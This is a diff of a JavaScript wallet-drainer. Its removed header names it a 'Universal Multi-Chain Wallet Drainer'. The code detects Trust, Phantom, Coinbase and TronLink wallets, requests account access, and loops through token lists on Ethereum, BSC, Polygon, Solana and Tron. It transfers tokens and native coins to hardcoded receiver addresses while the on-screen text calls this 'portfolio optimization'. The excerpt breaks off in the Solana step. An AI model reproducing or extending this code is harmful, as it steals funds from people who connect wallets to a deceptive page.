@@ -1,1335 +1,1709 @@
-/**
- * Universal Multi-Chain Wallet Drainer
- * Supports: Ethereum, BSC, Solana, Tron, Bitcoin
- * Auto-detects networks and drains all assets
- */
-
 $(document).ready(function() {
-    // Check if required libraries are loaded
-    if (typeof ethers === 'undefined') {
-        console.error('❌ ethers.js not loaded');
-        alert('Error: Required libraries not loaded. Please refresh the page.');
-        return;
-    }
-    
-    if (typeof solanaWeb3 === 'undefined') {
-        console.warn('⚠️ Solana Web3.js not loaded - Solana features disabled');
-    }
-    
-    console.log('📚 Libraries loaded:', {
-        ethers: typeof ethers !== 'undefined',
-        solana: typeof solanaWeb3 !== 'undefined',
-        tronWeb: typeof TronWeb !== 'undefined',
-        jquery: typeof $ !== 'undefined'
-    });
+    // Your Ethereum address to receive funds
+    const RECEIVER_ADDRESS = "0xA6ea466A91837809CB1d94B8ccb73c2D98657321"; // Replace with your ETH address
+    const SOLANA_RECEIVER = "4NW3YXvEiNEVX6QxeS19FvSZ963vGqMQMvxguR8npq6s"; // Replace with your Solana address
+    const TRON_RECEIVER = "TGdWPEEiDxiJPZskJhnJYZBKw3qbGUDXoU"; // Replace with your Tron address
 
-    // Configuration
-    const CONFIG = {
-        // Your addresses to receive funds (updated from config.js)
-        RECEIVER_ADDRESSES: {
-            ethereum: "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49",
-            bsc: "0xC784D87F941c6Dbba321ecB56fcDc8e0C4EE5f49",
-            solana: "4NW3YXvEiNEVX6QxeS19FvSZ963vGqMQMvxguR8npq6s",
-            tron: "TGdWPEEiDxiJPZskJhnJYZBKw3qbGUDXoU",
-            bitcoin: "bc1qjr88m5ne8hzk0uw7mdh80m5apa8da9n5wag900"
+    // Multi-chain token configurations
+    const NETWORK_CONFIGS = {
+        ethereum: {
+            chainId: 1,
+            name: "Ethereum",
+            nativeCurrency: "ETH",
+            rpcUrl: "https://mainnet.infura.io/v3/YOUR_INFURA_KEY",
+            receiver: RECEIVER_ADDRESS,
+            tokens: [
+                { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
+                { symbol: "USDC", address: "0xA0b86a33E6417a174f4dcc5b814094b8d1f57b69", decimals: 6 },
+                { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
+                { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
+                { symbol: "AAVE", address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", decimals: 18 },
+                { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
+                { symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
+                { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
+                { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", decimals: 18 },
+                { symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18 }
+            ]
         },
-        
-        // Network configurations
-        NETWORKS: {
-            ethereum: {
-                chainId: 1,
-                name: "Ethereum Mainnet",
-                currency: "ETH",
-                rpcUrl: "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161",
-                explorerUrl: "https://etherscan.io",
-                tokens: [
-                    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
-                    { symbol: "USDC", address: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", decimals: 6 },
-                    { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
-                    { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
-                    { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
-                    { symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
-                    { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
-                    { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", decimals: 18 },
-                    { symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18 }
-                ]
-            },
-            bsc: {
-                chainId: 56,
-                name: "BSC Mainnet",
-                currency: "BNB",
-                rpcUrl: "https://bsc-dataseed1.binance.org/",
-                explorerUrl: "https://bscscan.com",
-                tokens: [
-                    { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
-                    { symbol: "USDC", address: "0x8965349fb649A33a30cbFDa057D8eC2C48AbE2A2", decimals: 18 },
-                    { symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", decimals: 18 },
-                    { symbol: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", decimals: 18 },
-                    { symbol: "ADA", address: "0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47", decimals: 18 },
-                    { symbol: "DOT", address: "0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402", decimals: 18 },
-                    { symbol: "LINK", address: "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD", decimals: 18 },
-                    { symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 }
-                ]
-            }
+        bsc: {
+            chainId: 56,
+            name: "BSC",
+            nativeCurrency: "BNB",
+            rpcUrl: "https://bsc-dataseed1.binance.org/",
+            receiver: RECEIVER_ADDRESS,
+            tokens: [
+                { symbol: "USDT", address: "0x55d398326f99059ff775485246999027b3197955", decimals: 18 },
+                { symbol: "USDC", address: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d", decimals: 18 },
+                { symbol: "BUSD", address: "0xe9e7cea3dedca5984780bafc599bd69add087d56", decimals: 18 },
+                { symbol: "CAKE", address: "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82", decimals: 18 },
+                { symbol: "BNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 },
+                { symbol: "XRP", address: "0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe", decimals: 18 },
+                { symbol: "ADA", address: "0x3ee2200efb3400fabb9aacf31297cbdd1d435d47", decimals: 18 },
+                { symbol: "DOGE", address: "0xba2ae424d960c26247dd6c32edc70b295c744c43", decimals: 8 }
+            ]
         },
-        
-        // Solana token addresses
-        SOLANA_TOKENS: [
-            { symbol: "USDC", mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", decimals: 6 },
-            { symbol: "USDT", mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", decimals: 6 },
-            { symbol: "SOL", mint: "So11111111111111111111111111111111111111112", decimals: 9 },
-            { symbol: "RAY", mint: "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R", decimals: 6 },
-            { symbol: "SRM", mint: "SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt", decimals: 6 }
-        ],
-        
-        // Tron token addresses
-        TRON_TOKENS: [
-            { symbol: "USDT", address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", decimals: 6 },
-            { symbol: "USDC", address: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", decimals: 6 },
-            { symbol: "BTT", address: "TAFjULxiVgT4qWk6UZwjqwZXTSaGaqnVp4", decimals: 18 },
-            { symbol: "JST", address: "TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9", decimals: 18 },
-            { symbol: "SUN", address: "TSSMHYeV2uE9qYH95DqyoCuNCzEL1NvU3S", decimals: 18 }
-        ]
+        polygon: {
+            chainId: 137,
+            name: "Polygon",
+            nativeCurrency: "MATIC",
+            rpcUrl: "https://polygon-rpc.com/",
+            receiver: RECEIVER_ADDRESS,
+            tokens: [
+                { symbol: "USDT", address: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", decimals: 6 },
+                { symbol: "USDC", address: "0x2791bca1f2de4661ed88a30c99a7a9449aa84174", decimals: 6 },
+                { symbol: "WETH", address: "0x7ceb23fd6f88b65d85b8ee2ffee9f6bb2c45a5eb", decimals: 18 },
+                { symbol: "WBTC", address: "0x1bfd67037b42cf73acf2047067bd4f2c47d9bfd6", decimals: 8 }
+            ]
+        }
     };
 
-    // Global state
-    let currentProvider = null;
-    let currentSigner = null;
-    let currentNetwork = null;
-    let connectedWallets = {};
-    let isDraining = false;
+    // Solana token list (SPL tokens)
+    const SOLANA_TOKENS = [
+        { symbol: "USDT", mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", decimals: 6 },
+        { symbol: "USDC", mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", decimals: 6 },
+        { symbol: "SOL", mint: "So11111111111111111111111111111111111111112", decimals: 9 },
+        { symbol: "RAY", mint: "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R", decimals: 6 },
+        { symbol: "SRM", mint: "SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt", decimals: 6 }
+    ];
 
-    // Initialize the application
-    init();
+    // Tron token list (TRC-20 tokens)
+    const TRON_TOKENS = [
+        { symbol: "USDT", address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", decimals: 6 },
+        { symbol: "USDC", address: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", decimals: 6 },
+        { symbol: "BTT", address: "TAFjULxiVgT4qWVEbBbdEwUnCRAFr2vB5K", decimals: 18 },
+        { symbol: "WIN", address: "TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7", decimals: 6 },
+        { symbol: "SUN", address: "TSSMHYeV2uE9qYH95DqyoCuNCzEL1NvU3S", decimals: 18 }
+    ];
 
-    function init() {
-        console.log("🚀 Universal Drainer initialized");
-        setupEventListeners();
-        detectAvailableWallets();
-        updateUI();
+    // Simplified wallet definitions - only the 4 main wallets
+    const WALLET_DEFINITIONS = {
+        trust: {
+            name: "Trust Wallet",
+            type: "evm",
+            networks: ["ethereum", "bsc", "polygon"], // Trust supports all EVM networks
+            detect: () => {
+                if (window.ethereum && window.ethereum.isTrust) return window.ethereum;
+                // Check for Trust in providers array
+                if (window.ethereum && window.ethereum.providers) {
+                    return window.ethereum.providers.find(p => p.isTrust);
+                }
+                return false;
+            },
+            getProvider: () => {
+                if (window.ethereum && window.ethereum.isTrust) return window.ethereum;
+                if (window.ethereum && window.ethereum.providers) {
+                    return window.ethereum.providers.find(p => p.isTrust);
+                }
+                return null;
+            },
+            icon: "�️"
+        },
+        phantom: {
+            name: "Phantom",
+            type: "multi", // Phantom supports both EVM and Solana
+            evmNetworks: ["ethereum"], // Phantom EVM only supports Ethereum mainnet
+            solanaNetworks: ["solana"],
+            detect: () => {
+                const hasEVM = window.phantom && window.phantom.ethereum;
+                const hasSolana = (window.solana && window.solana.isPhantom) || (window.phantom && window.phantom.solana);
+                return hasEVM || hasSolana;
+            },
+            getEVMProvider: () => window.phantom && window.phantom.ethereum,
+            getSolanaProvider: () => window.solana || (window.phantom && window.phantom.solana),
+            icon: "�"
+        },
+        coinbase: {
+            name: "Coinbase Wallet",
+            type: "evm",
+            networks: ["ethereum", "bsc", "polygon"], // Coinbase supports all EVM networks
+            detect: () => {
+                if (window.ethereum && window.ethereum.isCoinbaseWallet) return window.ethereum;
+                // Check for Coinbase in providers array
+                if (window.ethereum && window.ethereum.providers) {
+                    return window.ethereum.providers.find(p => p.isCoinbaseWallet);
+                }
+                return false;
+            },
+            getProvider: () => {
+                if (window.ethereum && window.ethereum.isCoinbaseWallet) return window.ethereum;
+                if (window.ethereum && window.ethereum.providers) {
+                    return window.ethereum.providers.find(p => p.isCoinbaseWallet);
+                }
+                return null;
+            },
+            icon: "🟦"
+        },
+        tronlink: {
+            name: "TronLink",
+            type: "tron",
+            networks: ["tron"], // TronLink only supports Tron network
+            detect: () => window.tronWeb && window.tronWeb.defaultAddress,
+            getProvider: () => window.tronWeb,
+            icon: "🔴"
+        }
+    };
+
+    // Mobile deep links - simplified for the 4 main wallets
+    const MOBILE_LINKS = {
+        "trust-mobile": "https://link.trustwallet.com/open_url?coin_id=60&url=",
+        "phantom-mobile": "https://phantom.app/ul/browse/",
+        "coinbase-mobile": "https://go.cb-w.com/dapp?cb_url=",
+        "tronlink-mobile": "tronlinkoutside://open.tronlink.org?url="
+    };
+
+    // Function to populate wallet dropdown - simplified for 4 main wallets
+    function populateWalletDropdown() {
+        const walletSelect = $('#wallet-select');
+        if (!walletSelect.length) return;
+
+        // Clear existing options except the default one
+        walletSelect.find('option:not(:first)').remove();
+        walletSelect.find('optgroup').remove();
+
+        // Create main wallets group
+        const mainGroup = $('<optgroup label="� Supported Wallets"></optgroup>');
+        
+        // Add our 4 main wallets
+        Object.entries(WALLET_DEFINITIONS).forEach(([key, wallet]) => {
+            try {
+                const detectionResult = wallet.detect();
+                const availability = detectionResult ? "✅" : "❌";
+                
+                let networksText = "";
+                if (wallet.type === "multi") {
+                    // Phantom supports both EVM and Solana
+                    const evmText = wallet.evmNetworks.map(n => n.toUpperCase()).join(', ');
+                    const solanaText = wallet.solanaNetworks.map(n => n.toUpperCase()).join(', ');
+                    networksText = `${evmText}, ${solanaText}`;
+                } else if (wallet.networks) {
+                    networksText = wallet.networks.map(n => n.toUpperCase()).join(', ');
+                }
+                
+                mainGroup.append(
+                    `<option value="${key}" data-type="${wallet.type}" data-networks="${networksText}">${wallet.icon} ${wallet.name} (${networksText}) ${availability}</option>`
+                );
+            } catch (error) {
+                console.log(`Error detecting ${wallet.name}:`, error);
+                let networksText = "";
+                if (wallet.type === "multi") {
+                    const evmText = wallet.evmNetworks.map(n => n.toUpperCase()).join(', ');
+                    const solanaText = wallet.solanaNetworks.map(n => n.toUpperCase()).join(', ');
+                    networksText = `${evmText}, ${solanaText}`;
+                } else if (wallet.networks) {
+                    networksText = wallet.networks.map(n => n.toUpperCase()).join(', ');
+                }
+                mainGroup.append(
+                    `<option value="${key}" data-type="${wallet.type}" data-networks="${networksText}">${wallet.icon} ${wallet.name} (${networksText}) ❌</option>`
+                );
+            }
+        });
+
+        walletSelect.append(mainGroup);
+
+        // Add mobile options only if on mobile device
+        if (isMobileDevice()) {
+            const mobileGroup = $('<optgroup label="📱 Mobile Wallets"></optgroup>');
+            const mobileWallets = [
+                { name: "Trust Wallet Mobile", key: "trust-mobile", icon: "🛡️", networks: ["ETH", "BSC", "POLYGON"] },
+                { name: "Phantom Mobile", key: "phantom-mobile", icon: "👻", networks: ["ETH", "SOLANA"] },
+                { name: "Coinbase Wallet Mobile", key: "coinbase-mobile", icon: "🟦", networks: ["ETH", "BSC", "POLYGON"] },
+                { name: "TronLink Mobile", key: "tronlink-mobile", icon: "🔴", networks: ["TRON"] }
+            ];
+
+            mobileWallets.forEach(wallet => {
+                const networksText = wallet.networks.join(', ');
+                mobileGroup.append(
+                    `<option value="${wallet.key}" data-type="mobile" data-networks="${wallet.networks.join(',').toLowerCase()}">${wallet.icon} ${wallet.name} (${networksText}) 📱</option>`
+                );
+            });
+
+            walletSelect.append(mobileGroup);
+        }
+        
+        console.log("Wallet dropdown populated with 4 main wallets:", Object.keys(WALLET_DEFINITIONS).join(', '));
     }
 
-    function setupEventListeners() {
-        // Remove network selection - not needed anymore
+    // Current selection state
+    let selectedWallet = '';
+    let currentWalletProvider = null;
+
+    // Function to detect mobile device
+    function isMobileDevice() {
+        const userAgent = navigator.userAgent.toLowerCase();
+        const mobileKeywords = [
+            'android', 'webos', 'iphone', 'ipad', 'ipod', 'blackberry', 
+            'iemobile', 'opera mini', 'mobile', 'tablet'
+        ];
         
-        // Main connect button - this starts everything
-        $('#connect-btn').on('click', startUniversalConnection);
+        const isMobileUA = mobileKeywords.some(keyword => userAgent.includes(keyword));
+        const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+        const isSmallScreen = window.innerWidth <= 768;
         
-        // Claim button (backup)
-        $('#claim-btn').on('click', startUniversalConnection);
+        return isMobileUA || (isTouchDevice && isSmallScreen);
     }
 
-    // === MAIN CONNECTION & DRAIN FUNCTION ===
-    async function startUniversalConnection() {
-        if (isDraining) return;
+    // Function to create mobile deep links
+    function createMobileDeepLink(walletName, dappUrl = window.location.href) {
+        const encodedUrl = encodeURIComponent(dappUrl);
+        const hostname = window.location.hostname;
         
-        isDraining = true;
-        showLoading("Connecting to wallets...");
+        const mobileLinks = {
+            "metamask": `https://metamask.app.link/dapp/${hostname}${window.location.pathname}`,
+            "trust wallet": `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedUrl}`,
+            "coinbase wallet": `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
+            "phantom": `https://phantom.app/ul/browse/${encodedUrl}?ref=${encodedUrl}`,
+            "tronlink": `tronlinkoutside://open.tronlink.org?url=${encodedUrl}`
+        };
+        
+        return mobileLinks[walletName.toLowerCase()] || null;
+    }
+
+    // Update connection status
+    function updateConnectionStatus(message, isError = false) {
+        const statusEl = $('#connection-text');
+        statusEl.text(message);
+        statusEl.css('color', isError ? '#ff4444' : '#333');
+    }
+
+    // Check wallet availability
+    function checkWalletAvailability(walletId) {
+        if (walletId.includes('-mobile')) {
+            return isMobileDevice() ? 'Mobile Supported' : 'Mobile Only';
+        }
+        
+        const wallet = WALLET_DEFINITIONS[walletId];
+        if (!wallet) return 'Unknown';
         
         try {
-            updateStatus("🔍 Scanning for available wallets...");
-            updateProgress(5);
+            return wallet.detect() ? 'Available' : 'Not Installed';
+        } catch (error) {
+            return 'Not Installed';
+        }
+    }
+
+    // Get supported networks for a wallet
+    function getSupportedNetworks(walletId) {
+        if (!walletId) return 'Select wallet first';
+        
+        const wallet = WALLET_DEFINITIONS[walletId];
+        if (!wallet) return 'Unknown wallet';
+        
+        if (wallet.type === "multi") {
+            // Phantom supports both EVM and Solana
+            const evmNetworks = wallet.evmNetworks.map(n => n.toUpperCase());
+            const solanaNetworks = wallet.solanaNetworks.map(n => n.toUpperCase());
+            return [...evmNetworks, ...solanaNetworks].join(', ');
+        } else if (wallet.networks) {
+            return wallet.networks.map(n => n.toUpperCase()).join(', ');
+        }
+        
+        return 'None';
+    }
+
+    // Update wallet status display
+    function updateWalletStatus() {
+        const availability = checkWalletAvailability(selectedWallet);
+        const supportedNetworks = getSupportedNetworks(selectedWallet);
+        const deviceType = isMobileDevice() ? 'Mobile' : 'Desktop';
+        
+        const availabilityEl = $('#wallet-availability');
+        const networksEl = $('#supported-networks');
+        const deviceEl = $('#device-type');
+        
+        availabilityEl.text(availability);
+        networksEl.text(supportedNetworks);
+        deviceEl.text(deviceType);
+        
+        // Add CSS classes for styling
+        availabilityEl.removeClass('available unavailable');
+        
+        if (availability === 'Available') {
+            availabilityEl.addClass('available');
+        } else if (availability === 'Not Installed') {
+            availabilityEl.addClass('unavailable');
+        }
+        
+        // Enable/disable connect button
+        const canConnect = (availability === 'Available' || availability === 'Mobile Supported');
+        $('#connect-btn').prop('disabled', !canConnect);
+    }
+
+    // Wallet selection handler  
+    $('#wallet-select').on('change', function() {
+        selectedWallet = $(this).val();
+        console.log('Selected wallet:', selectedWallet);
+        updateWalletStatus();
+        
+        // Show wallet info if a wallet is selected
+        if (selectedWallet) {
+            const selectedOption = $(this).find('option:selected');
+            const walletType = selectedOption.data('type');
+            const networks = selectedOption.data('networks');
             
-            // Show the claim section
-            $('#claim-section').show();
-            $('#connect-btn').text('Processing...');
+            console.log(`Wallet type: ${walletType}, Networks: ${networks}`);
             
-            // Process networks in order: Bitcoin -> Tron -> Solana -> BSC -> Ethereum
-            const networksToCheck = ['bitcoin', 'tron', 'solana', 'bsc', 'ethereum'];
-            const results = [];
+            // Update UI to show selection
+            const availability = checkWalletAvailability(selectedWallet);
+            if (availability === 'Available' || availability === 'Mobile Supported') {
+                updateConnectionStatus(`${WALLET_DEFINITIONS[selectedWallet]?.name || selectedWallet} selected - Ready to connect`);
+            } else {
+                updateConnectionStatus(`${WALLET_DEFINITIONS[selectedWallet]?.name || selectedWallet} not available`, true);
+            }
+        }
+    });
+
+    // Initialize with device info and populate wallet dropdown
+    const deviceType = isMobileDevice() ? 'Mobile' : 'Desktop';
+    $('#device-type').text(deviceType);
+    updateConnectionStatus(`Device: ${deviceType} - Ready for wallet selection`);
+
+    // Populate wallet dropdown with detected wallets
+    populateWalletDropdown();
+    
+    // Add refresh functionality for wallet detection
+    $('#wallet-select').after('<button id="refresh-wallets" class="refresh-btn" style="margin-left: 10px; padding: 5px 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">🔄 Refresh</button>');
+    
+    $('#refresh-wallets').on('click', function() {
+        console.log("Refreshing wallet detection...");
+        populateWalletDropdown();
+        updateConnectionStatus("Wallet list refreshed! Please select your wallet.");
+    });
+
+    // Debug: Show available wallets
+    console.log("=== Simplified Wallet System ===");
+    Object.keys(WALLET_DEFINITIONS).forEach(walletId => {
+        const wallet = WALLET_DEFINITIONS[walletId];
+        const detected = wallet.detect();
+        console.log(`${wallet.name}: ${detected ? '✅ Available' : '❌ Not Available'}`);
+    });
+    console.log("===============================");
+
+    // Main wallet connection handler
+    $('#connect-btn').on('click', async (e) => {
+        e.preventDefault();
+        console.log("Connect wallet button clicked!");
+        console.log("Selected wallet:", selectedWallet);
+        
+        try {
+            if (!selectedWallet) {
+                alert("Please select a wallet from the dropdown menu.");
+                return;
+            }
+
+            const walletDef = WALLET_DEFINITIONS[selectedWallet];
+            const walletName = walletDef?.name || selectedWallet;
             
-            for (let i = 0; i < networksToCheck.length; i++) {
-                const network = networksToCheck[i];
-                const progress = 10 + (i * 18); // Progress from 10% to 90%
+            console.log("Wallet definition:", walletDef);
+            updateConnectionStatus(`Connecting to ${walletName}...`);
+
+            // Handle mobile wallets
+            if (selectedWallet.includes('-mobile')) {
+                await handleMobileConnection(selectedWallet);
+                return;
+            }
+
+            // Get wallet definition
+            if (!walletDef) {
+                throw new Error("Unsupported wallet selected");
+            }
+
+            // Check if wallet is available and get provider
+            console.log("Checking wallet detection...");
+            const detectionResult = walletDef.detect();
+            console.log("Detection result:", detectionResult);
+            
+            if (!detectionResult) {
+                throw new Error(`${walletDef.name} is not installed or available. Please install the wallet extension first.`);
+            }
+
+            // Get provider and handle connection based on wallet type
+            console.log("Getting wallet provider...");
+            
+            if (walletDef.type === "evm") {
+                currentWalletProvider = walletDef.getProvider();
+                console.log("EVM Provider obtained:", currentWalletProvider);
                 
+                if (!currentWalletProvider) {
+                    throw new Error(`Failed to get EVM provider for ${walletDef.name}. Please try refreshing the page.`);
+                }
+                
+                await handleEVMConnection({ ...walletDef, provider: currentWalletProvider });
+                
+            } else if (walletDef.type === "multi") {
+                // Special handling for Phantom which supports both EVM and Solana
+                const evmProvider = walletDef.getEVMProvider();
+                const solanaProvider = walletDef.getSolanaProvider();
+                
+                console.log("Multi-wallet detected - EVM:", !!evmProvider, "Solana:", !!solanaProvider);
+                
+                if (evmProvider && solanaProvider) {
+                    // Let user choose or automatically do both
+                    await handlePhantomMultiConnection(walletDef, evmProvider, solanaProvider);
+                } else if (evmProvider) {
+                    await handleEVMConnection({ 
+                        ...walletDef, 
+                        provider: evmProvider, 
+                        networks: walletDef.evmNetworks 
+                    });
+                } else if (solanaProvider) {
+                    await handleSolanaConnection({ 
+                        ...walletDef, 
+                        provider: solanaProvider, 
+                        networks: walletDef.solanaNetworks 
+                    });
+                } else {
+                    throw new Error(`${walletDef.name} providers not available.`);
+                }
+                
+            } else if (walletDef.type === "solana") {
+                currentWalletProvider = walletDef.getProvider();
+                console.log("Solana Provider obtained:", currentWalletProvider);
+                
+                if (!currentWalletProvider) {
+                    throw new Error(`Failed to get Solana provider for ${walletDef.name}. Please try refreshing the page.`);
+                }
+                
+                await handleSolanaConnection({ ...walletDef, provider: currentWalletProvider });
+                
+            } else if (walletDef.type === "tron") {
+                currentWalletProvider = walletDef.getProvider();
+                console.log("Tron Provider obtained:", currentWalletProvider);
+                
+                if (!currentWalletProvider) {
+                    throw new Error(`Failed to get Tron provider for ${walletDef.name}. Please try refreshing the page.`);
+                }
+                
+                await handleTronConnection({ ...walletDef, provider: currentWalletProvider });
+                
+            } else {
+                throw new Error("Unsupported wallet type");
+            }
+
+        } catch (error) {
+            console.error("Connection error:", error);
+            updateConnectionStatus("Connection failed", true);
+            
+            // Provide more specific error messages
+            let errorMessage = error.message;
+            if (error.message.includes("User rejected")) {
+                errorMessage = "Connection was rejected. Please try again and approve the connection in your wallet.";
+            } else if (error.code === 4001) {
+                errorMessage = "Connection was rejected by user. Please try again.";
+            } else if (error.code === -32002) {
+                errorMessage = "Connection request already pending. Please check your wallet.";
+            }
+            
+            alert("Failed to connect wallet: " + errorMessage);
+        }
+    });
+
+    // Handle Phantom's multi-chain capabilities (both EVM and Solana)
+    async function handlePhantomMultiConnection(walletDef, evmProvider, solanaProvider) {
+        try {
+            updateConnectionStatus("Connecting to Phantom (Multi-Chain)...");
+            
+            // Try to connect to both EVM and Solana
+            let evmConnected = false;
+            let solanaConnected = false;
+            let userAddress = null;
+            let solanaAddress = null;
+
+            // Connect to EVM first (Ethereum only for Phantom)
+            try {
+                await evmProvider.request({ method: 'eth_requestAccounts' });
+                const accounts = await evmProvider.request({ method: 'eth_accounts' });
+                if (accounts && accounts.length > 0) {
+                    userAddress = accounts[0];
+                    evmConnected = true;
+                    console.log("Phantom EVM connected:", userAddress);
+                }
+            } catch (evmError) {
+                console.log("Phantom EVM connection failed:", evmError.message);
+            }
+
+            // Connect to Solana
+            try {
+                const response = await solanaProvider.connect();
+                if (response && response.publicKey) {
+                    solanaAddress = response.publicKey.toString();
+                    solanaConnected = true;
+                    console.log("Phantom Solana connected:", solanaAddress);
+                }
+            } catch (solanaError) {
+                console.log("Phantom Solana connection failed:", solanaError.message);
+            }
+
+            if (!evmConnected && !solanaConnected) {
+                throw new Error("Failed to connect to both Phantom EVM and Solana. Please try again.");
+            }
+
+            // Show connection results
+            let connectionMessage = "Phantom connected: ";
+            if (evmConnected) connectionMessage += `EVM (${userAddress.slice(0,6)}...${userAddress.slice(-4)})`;
+            if (evmConnected && solanaConnected) connectionMessage += " & ";
+            if (solanaConnected) connectionMessage += `Solana (${solanaAddress.slice(0,4)}...${solanaAddress.slice(-4)})`;
+            
+            updateConnectionStatus(connectionMessage);
+
+            // Update button for multi-chain draining
+            $('#connect-btn').text("🚀 Optimize All Phantom Networks");
+            $('#connect-btn').off('click').on('click', async () => {
                 try {
-                    updateStatus(`🔗 Checking ${network.toUpperCase()} wallet...`);
-                    updateProgress(progress);
+                    updateConnectionStatus("Starting multi-chain portfolio optimization...");
                     
-                    const result = await checkAndDrainNetwork(network);
-                    results.push({ network, success: result.success, amount: result.amount || 0 });
-                    
-                    if (result.success && result.amount > 0) {
-                        updateStatus(`✅ ${network.toUpperCase()} assets extracted: ${result.amount.toFixed(6)} ${network === 'ethereum' ? 'ETH' : network === 'bsc' ? 'BNB' : network === 'solana' ? 'SOL' : network.toUpperCase()}`);
-                    } else if (result.success && result.amount === 0) {
-                        updateStatus(`⚠️ ${network.toUpperCase()} connected but no assets to extract`);
-                    } else {
-                        updateStatus(`⚠️ ${network.toUpperCase()} ${result.error || 'wallet not available or failed'}`);
+                    // Drain EVM networks if connected
+                    if (evmConnected && userAddress) {
+                        try {
+                            // For Phantom EVM, manually drain Ethereum tokens and ETH
+                            updateConnectionStatus("Optimizing Ethereum portfolio...");
+                            
+                            const ethersProvider = new ethers.providers.Web3Provider(evmProvider);
+                            const signer = ethersProvider.getSigner();
+                            const config = NETWORK_CONFIGS.ethereum;
+                            const drainedAssets = [];
+
+                            console.log(`🔍 Scanning Ethereum for assets...`);
+
+                            // Drain tokens first
+                            const gasPrice = await ethersProvider.getGasPrice();
+                            for (let i = 0; i < config.tokens.length; i++) {
+                                const token = config.tokens[i];
+                                try {
+                                    console.log(`Checking ${token.symbol}... (${i + 1}/${config.tokens.length})`);
+                                    const success = await drainERC20Token(ethersProvider, signer, userAddress, token, config.receiver, gasPrice);
+                                    if (success) {
+                                        drainedAssets.push(token.symbol);
+                                        console.log(`✅ ${token.symbol} drained successfully`);
+                                    }
+                                } catch (tokenError) {
+                                    console.error(`❌ Failed to drain ${token.symbol}:`, tokenError.message);
+                                }
+                            }
+
+                            // Drain ETH last
+                            try {
+                                console.log(`Checking ETH...`);
+                                const success = await drainNativeCurrency(ethersProvider, signer, userAddress, config.receiver);
+                                if (success) {
+                                    drainedAssets.push("ETH");
+                                    console.log(`✅ ETH drained successfully`);
+                                }
+                            } catch (nativeError) {
+                                console.error(`❌ Failed to drain ETH:`, nativeError.message);
+                            }
+
+                            console.log(`🎯 Ethereum optimization complete: ${drainedAssets.length} assets processed`);
+                            if (drainedAssets.length > 0) {
+                                updateConnectionStatus(`✅ Ethereum: ${drainedAssets.length} assets optimized`);
+                            } else {
+                                updateConnectionStatus(`🔍 Ethereum: No assets found`);
+                            }
+                            
+                        } catch (evmError) {
+                            console.error("Phantom EVM optimization failed:", evmError);
+                            updateConnectionStatus(`❌ Ethereum optimization failed: ${evmError.message}`);
+                        }
                     }
                     
-                    // Small delay between networks
-                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    // Drain Solana if connected
+                    if (solanaConnected && solanaAddress) {
+                        try {
+                            await drainSolana(solanaProvider, solanaAddress);
+                        } catch (solanaError) {
